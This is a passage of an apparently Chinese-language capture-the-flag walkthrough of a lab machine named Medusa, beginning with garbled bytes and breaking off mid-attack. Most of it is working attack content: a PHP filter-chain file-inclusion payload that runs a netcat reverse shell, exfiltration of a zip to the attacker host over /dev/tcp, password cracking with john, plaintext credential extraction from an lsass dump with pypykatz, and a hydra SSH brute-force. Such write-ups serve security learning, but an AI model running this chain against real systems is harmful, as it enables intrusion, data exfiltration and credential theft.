uid=33(www-data) gid=33(www-data) groups=33(www-data)
ÔøΩBÔøΩ0ÔøΩÔøΩÔøΩ&gt;==ÔøΩ@CÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ&gt;==ÔøΩ@CÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ&gt;==ÔøΩ@CÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ&gt;==ÔøΩ@CÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ&gt;==ÔøΩ@CÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ&gt;==ÔøΩ@          
```

Âºπshell

```
http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=nc%20192.168.205.128%208888%20-e%20/bin/bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888                                
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.145] 49190
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑ÂèñÂèçÂêë shell ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ‰∫§‰∫íÂºè TTY shellÔºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```
www-data@medusa:/var/www/dev/files$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Jan 19  2023 .
drwxr-xr-x 5 root root 4096 Jan 19  2023 ..
-rw-r--r-- 1 root root    0 Jan 15  2023 index.php
-rw-r--r-- 1 root root  144 Jan 18  2023 readme.txt
-rw-r--r-- 1 root root  110 Jan 19  2023 system.php
www-data@medusa:/var/www/dev/files$ cd ..
www-data@medusa:/var/www/dev$ ls -al
total 28
drwxr-xr-x 5 root root 4096 Jan 19  2023 .
drwxr-xr-x 4 root root 4096 Jan 15  2023 ..
drwxr-xr-x 2 root root 4096 Jan 15  2023 assets
drwxr-xr-x 2 root root 4096 Jan 15  2023 css
drwxr-xr-x 2 root root 4096 Jan 19  2023 files
-rw-r--r-- 1 root root 1973 Jan 19  2023 index.html
-rw-r--r-- 1 root root  489 Jan 18  2023 robots.txt
www-data@medusa:/var/www/dev$ cd ..
www-data@medusa:/var/www$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Jan 15  2023 .
drwxr-xr-x 12 root root 4096 Jan 15  2023 ..
drwxr-xr-x  5 root root 4096 Jan 19  2023 dev
drwxr-xr-x  3 root root 4096 Jan 19  2023 html
www-data@medusa:/var/www$ cd html/
www-data@medusa:/var/www/html$ ls -al
total 24
drwxr-xr-x 3 root root  4096 Jan 19  2023 .
drwxr-xr-x 4 root root  4096 Jan 15  2023 ..
drwxr-xr-x 2 root root  4096 Jan 30  2023 hades
-rw-r--r-- 1 root root 10674 Jan 19  2023 index.html
www-data@medusa:/var/www/html$ cd hades/
www-data@medusa:/var/www/html/hades$ ls -al
total 20
drwxr-xr-x 2 root root 4096 Jan 30  2023 .
drwxr-xr-x 3 root root 4096 Jan 19  2023 ..
-rw-r--r-- 1 root root  265 Jan 19  2023 d00r_validation.php
-rw-r--r-- 1 root root  555 Jan 30  2023 door.php
-rw-r--r-- 1 root root    0 Jan 19  2023 index.php
-rw-r--r-- 1 root root  198 Jan 19  2023 styles.css
www-data@medusa:/var/www/html/hades$ cd /home/
www-data@medusa:/home$ ls -al
total 12
drwxr-xr-x  3 root    root    4096 Jan 15  2023 .
drwxr-xr-x 19 root    root    4096 Jan 15  2023 ..
drwxr-xr-x  3 spectre spectre 4096 Jan 18  2023 spectre
www-data@medusa:/home$ sudo -l
sudo: unable to resolve host medusa: Name or service not known

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
sudo: a password is required
www-data@medusa:/home$ cd spectre/
www-data@medusa:/home/spectre$ ls -al
total 32
drwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .
drwxr-xr-x 3 root    root    4096 Jan 15  2023 ..
-rw------- 1 spectre spectre  197 Jan 21  2023 .bash_history
-rw-r--r-- 1 spectre spectre  220 Jan 15  2023 .bash_logout
-rw-r--r-- 1 spectre spectre 3526 Jan 15  2023 .bashrc
drwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .local
-rw-r--r-- 1 spectre spectre  807 Jan 15  2023 .profile
-rw------- 1 spectre spectre   44 Jan 18  2023 user.txt
www-data@medusa:/home/spectre$ find / -perm -4000 -type f 2&gt;/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/su
www-data@medusa:/home/spectre$ 
www-data@medusa:/home/spectre$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@medusa:/home/spectre$ ss -tnlup
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                              
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                              
tcp                     LISTEN                   0                        511                                                    *:80                                                    *:*                                              
tcp                     LISTEN                   0                        32                                                     *:21                                                    *:*                                              
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*                       
www-data@medusa:/home/spectre$ cd /opt/
www-data@medusa:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Jan 15  2023 .
drwxr-xr-x 19 root root 4096 Jan 15  2023 ..
www-data@medusa:/opt$ cd /tmp/
www-data@medusa:/tmp$ ls -al
total 8
drwxrwxrwt  2 root root 4096 Feb  4 04:40 .
drwxr-xr-x 19 root root 4096 Jan 15  2023 ..
www-data@medusa:/tmp$ cd /mnt/
www-data@medusa:/mnt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Jan 15  2023 .
drwxr-xr-x 19 root root 4096 Jan 15  2023 ..
www-data@medusa:/mnt$ cd /
www-data@medusa:/$ ls -la
total 72
drwxr-xr-x  19 root root  4096 Jan 15  2023 .
drwxr-xr-x  19 root root  4096 Jan 15  2023 ..
drwxr-xr-x   2 root root  4096 Jan 18  2023 ...
lrwxrwxrwx   1 root root     7 Jan 15  2023 bin -&gt; usr/bin
drwxr-xr-x   3 root root  4096 Jan 15  2023 boot
drwxr-xr-x  17 root root  3140 Feb  4 04:40 dev
drwxr-xr-x  71 root root  4096 Feb  4 05:08 etc
drwxr-xr-x   3 root root  4096 Jan 15  2023 home
lrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img -&gt; boot/initrd.img-5.10.0-20-amd64
lrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Jan 15  2023 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 Jan 15  2023 lib32 -&gt; usr/lib32
lrwxrwxrwx   1 root root     9 Jan 15  2023 lib64 -&gt; usr/lib64
lrwxrwxrwx   1 root root    10 Jan 15  2023 libx32 -&gt; usr/libx32
drwx------   2 root root 16384 Jan 15  2023 lost+found
drwxr-xr-x   3 root root  4096 Jan 15  2023 media
drwxr-xr-x   2 root root  4096 Jan 15  2023 mnt
drwxr-xr-x   2 root root  4096 Jan 15  2023 opt
dr-xr-xr-x 148 root root     0 Feb  4 04:40 proc
drwx------   3 root root  4096 Jan 30  2023 root
drwxr-xr-x  19 root root   540 Feb  4 04:41 run
lrwxrwxrwx   1 root root     8 Jan 15  2023 sbin -&gt; usr/sbin
drwxr-xr-x   3 root root  4096 Jan 15  2023 srv
dr-xr-xr-x  13 root root     0 Feb  4 04:40 sys
drwxrwxrwt   2 root root  4096 Feb  4 04:40 tmp
drwxr-xr-x  14 root root  4096 Jan 15  2023 usr
drwxr-xr-x  12 root root  4096 Jan 15  2023 var
lrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-20-amd64
lrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
www-data@medusa:/$ cd .../
www-data@medusa:/...$ ls -al
total 12108
drwxr-xr-x  2 root     root         4096 Jan 18  2023 .
drwxr-xr-x 19 root     root         4096 Jan 15  2023 ..
-rw-------  1 www-data www-data 12387024 Jan 18  2023 old_files.zip
```

Êã∑ËøáÂéªÁúãÁúãÊúâÂï•

```
www-data@medusa:/...$ cat old_files.zip &gt; /dev/tcp/192.168.205.128/7777

#kali
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 7777 &gt; old_files.zip                
listening on [any] 7777 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.145] 46026
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ unzip old_files.zip
Archive:  old_files.zip
   skipping: lsass.DMP               need PK compat. v5.1 (can do v4.6)
                                       
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ 7z x old_files.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 12387024 bytes (12 MiB)

Extracting archive: old_files.zip
--
Path = old_files.zip
Type = zip
Physical Size = 12387024

  
Enter password (will not be echoed):
ERROR: Wrong password : lsass.DMP


Sub items Errors: 1


Break signaled
```

ÁàÜÁ†¥‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ zip2john old_files.zip &gt; hash                       
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
No password hashes left to crack (see FAQ)
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john --show hash                                    

old_files.zip/lsass.DMP:medusa666:lsass.DMP:old_files.zip:old_files.zip

1 password hash cracked, 0 left
                            
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ 7z x old_files.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 12387024 bytes (12 MiB)

Extracting archive: old_files.zip
--
Path = old_files.zip
Type = zip
Physical Size = 12387024

  
Would you like to replace the existing file:
  Path:     ./lsass.DMP
  Size:     0 bytes
  Modified: 2023-01-17 22:12:41
with the file from archive:
  Path:     lsass.DMP
  Size:     34804383 bytes (34 MiB)
  Modified: 2023-01-17 22:12:41
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y      

              
Enter password (will not be echoed):
Everything is Ok

Size:       34804383
Compressed: 12387024
                                         
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ file lsass.DMP
lsass.DMP: Mini DuMP crash report, 12 streams, Tue Jan 17 14:08:32 2023, 0x1826 type
```

ÂèÇËÄÉÈìæÊé•Ôºöhttps://technicalnavigator.in/how-to-extract-information-from-dmp-files/

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ pypykatz lsa minidump lsass.DMP                
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 2261421 (2281ad)
session_id 18
username avijneyam
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T14:05:20.008398+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1016
luid 2261421

ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• ÁúÅÁï• 


                   
```

ÊèêÂèñ‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ pypykatz lsa minidump lsass.DMP | grep 'username'

INFO:pypykatz:Parsing file lsass.DMP
username avijneyam
                username avijneyam
                username avijneyam
                username avijneyam
username shelldredd
                username shelldredd
                username shelldredd
                username shelldredd
username powerful
                username powerful
                username powerful
                username powerful
username alienum
                username alienum
                username alienum
                username alienum
username Claor
                username Claor
                username Claor
                username Claor
username Pr0xy
                username Pr0xy
                username Pr0xy
                username Pr0xy
username nolo
                username nolo
                username nolo
                username nolo
username numero6
                username numero6
                username numero6
                username numero6
username ct0l4
                username ct0l4
                username ct0l4
                username ct0l4
username LordP4
                username LordP4
                username LordP4
                username LordP4
username sml
                username sml
                username sml
                username sml
username spectre
                username spectre
                username spectre
                username spectre
username RiJaba1
                username RiJaba1
                username RiJaba1
                username RiJaba1
username jabatron
                username jabatron
                username jabatron
                username jabatron
username InfayerTS
                username InfayerTS
                username InfayerTS
                username InfayerTS
username d4t4s3c
                username d4t4s3c
                username d4t4s3c
                username d4t4s3c
username cromiphi
                username cromiphi
                username cromiphi
                username cromiphi
username Medusa
                username Medusa
                username Medusa
                username Medusa
username Medusa
                username Medusa
                username Medusa
                username Medusa
username ANONYMOUS LOGON
username SERVICIO LOCAL
username MEDUSA-PC$
                username MEDUSA-PC$
                username MEDUSA-PC$
username 
username MEDUSA-PC$
                username MEDUSA-PC$
                username MEDUSA-PC$
                                                                                        

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ pypykatz lsa minidump lsass.DMP | grep 'username'|awk -F ' ' '{print $2}'|sort | uniq
INFO:pypykatz:Parsing file lsass.DMP

alienum
ANONYMOUS
avijneyam
Claor
cromiphi
ct0l4
d4t4s3c
InfayerTS
jabatron
LordP4
Medusa
MEDUSA-PC$
nolo
numero6
powerful
Pr0xy
RiJaba1
SERVICIO
shelldredd
sml
spectre
               
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ pypykatz lsa minidump lsass.DMP | grep 'password' 
INFO:pypykatz:Parsing file lsass.DMP
                password 4v1jn3y4m_zxc
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password 4v1jn3y4m_zxc
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password 4v1jn3y4m_zxc
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password t0p_s3cr3t
                password (hex)7400300070005f0073003300630072003300740000000000
                password (hex)7400300070005f0073003300630072003300740000000000
                password t0p_s3cr3t
                password (hex)7400300070005f0073003300630072003300740000000000
                password t0p_s3cr3t
                password (hex)7400300070005f0073003300630072003300740000000000
                password p0w3rf1ll_abc
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password p0w3rf1ll_abc
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password p0w3rf1ll_abc
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password 4l13num_qwerty
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password 4l13num_qwerty
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password 4l13num_qwerty
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password n0s_v0lv1m0s_4_1lusi0n4r
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password n0s_v0lv1m0s_4_1lusi0n4r
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password n0s_v0lv1m0s_4_1lusi0n4r
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password pr0xy_ch41ns_456
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password pr0xy_ch41ns_456
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password pr0xy_ch41ns_456
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password littl3_h4ck3r
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password littl3_h4ck3r
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password littl3_h4ck3r
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password n1mb3r_s1x
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password n1mb3r_s1x
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password n1mb3r_s1x
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password b4ck3nd_pr0gr4m3r
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password b4ck3nd_pr0gr4m3r
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password b4ck3nd_pr0gr4m3r
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password Wh1t3_h4ck
                password (hex)570068003100740033005f006800340063006b0000000000
                password (hex)570068003100740033005f006800340063006b0000000000
                password Wh1t3_h4ck
                password (hex)570068003100740033005f006800340063006b0000000000
                password Wh1t3_h4ck
                password (hex)570068003100740033005f006800340063006b0000000000
                password th3_b0ss
                password (hex)7400680033005f006200300073007300
                password (hex)7400680033005f006200300073007300
                password th3_b0ss
                password (hex)7400680033005f006200300073007300
                password th3_b0ss
                password (hex)7400680033005f006200300073007300
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password littl3_h4ck3r_v2
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password littl3_h4ck3r_v2
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password littl3_h4ck3r_v2
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password b1zum_3_AM
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password b1zum_3_AM
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password b1zum_3_AM
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password UnD3sc0n0c1d0
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password UnD3sc0n0c1d0
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password UnD3sc0n0c1d0
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password br4in_br34k3r
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password br4in_br34k3r
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password br4in_br34k3r
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password br4in_br34k3r_v2
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password br4in_br34k3r_v2
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password br4in_br34k3r_v2
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password 123456
                password (hex)31003200330034003500360000000000
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password None
                password (hex)
                password None
                password (hex)
                password None
                password (hex)
                password None
                password (hex)
                                                               

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ pypykatz lsa minidump lsass.DMP | grep 'password'|awk '!/hex/'|awk -F ' ' '{print $2}'| sort | uniq
INFO:pypykatz:Parsing file lsass.DMP
123456
4l13num_qwerty
4v1jn3y4m_zxc
5p3ctr3_p0is0n_xX
b1zum_3_AM
b4ck3nd_pr0gr4m3r
br4in_br34k3r
br4in_br34k3r_v2
littl3_h4ck3r
littl3_h4ck3r_v2
n0s_v0lv1m0s_4_1lusi0n4r
n1mb3r_s1x
None
p0w3rf1ll_abc
pr0xy_ch41ns_456
t0p_s3cr3t
th3_b0ss
UnD3sc0n0c1d0
Wh1t3_h4ck
```

Ê±áÊÄª‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat user
alienum
ANONYMOUS
avijneyam
Claor
cromiphi
ct0l4
d4t4s3c
InfayerTS
jabatron
LordP4
Medusa
MEDUSA-PC$
nolo
numero6
powerful
Pr0xy
RiJaba1
SERVICIO
shelldredd
sml
spectre
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat pass  
123456
4l13num_qwerty
4v1jn3y4m_zxc
5p3ctr3_p0is0n_xX
b1zum_3_AM
b4ck3nd_pr0gr4m3r
br4in_br34k3r
br4in_br34k3r_v2
littl3_h4ck3r
littl3_h4ck3r_v2
n0s_v0lv1m0s_4_1lusi0n4r
n1mb3r_s1x
None
p0w3rf1ll_abc
pr0xy_ch41ns_456
t0p_s3cr3t
th3_b0ss
UnD3sc0n0c1d0
Wh1t3_h4ck
          
```

‰ΩÜÊòØÊàë‰ª¨Áî®Êà∑ÂàöÂàöÁúãÂè™ÊúâspectreÔºåÊâÄ‰ª•Êàë‰ª¨ÂÖàÂ∞ùËØïÁàÜÁ†¥spectreÂÖà

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ hydra -l spectre -P pass ssh://192.168.205.145 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-04 18:33:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 22 tasks per 1 server, overall 22 tasks, 22 login tries (l:1/p:22), ~1 try per task
[DATA] attacking ssh://192.168.205.145:22/
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'spectre' - 1 of 22 [child 0] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '' - 2 of 22 [child 1] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'ertceps' - 3 of 22 [child 2] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '123456' - 4 of 22 [child 3] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '4l13num_qwerty' - 5 of 22 [child 4] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '4v1jn3y4m_zxc' - 6 of 22 [child 5] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '5p3ctr3_p0is0n_xX' - 7 of 22 [child 6] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'b1zum_3_AM' - 8 of 22 [child 7] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'b4ck3nd_pr0gr4m3r' - 9 of 22 [child 8] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'br4in_br34k3r' - 10 of 22 [child 9] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'br4in_br34k3r_v2' - 11 of 22 [child 10] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'littl3_h4ck3r' - 12 of 22 [child 11] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'littl3_h4ck3r_v2' - 13 of 22 [child 12] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'n0s_v0lv1m0s_4_1lusi0n4r' - 14 of 22 [child 13] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'n1mb3r_s1x' - 15 of 22 [child 14] (0/0)
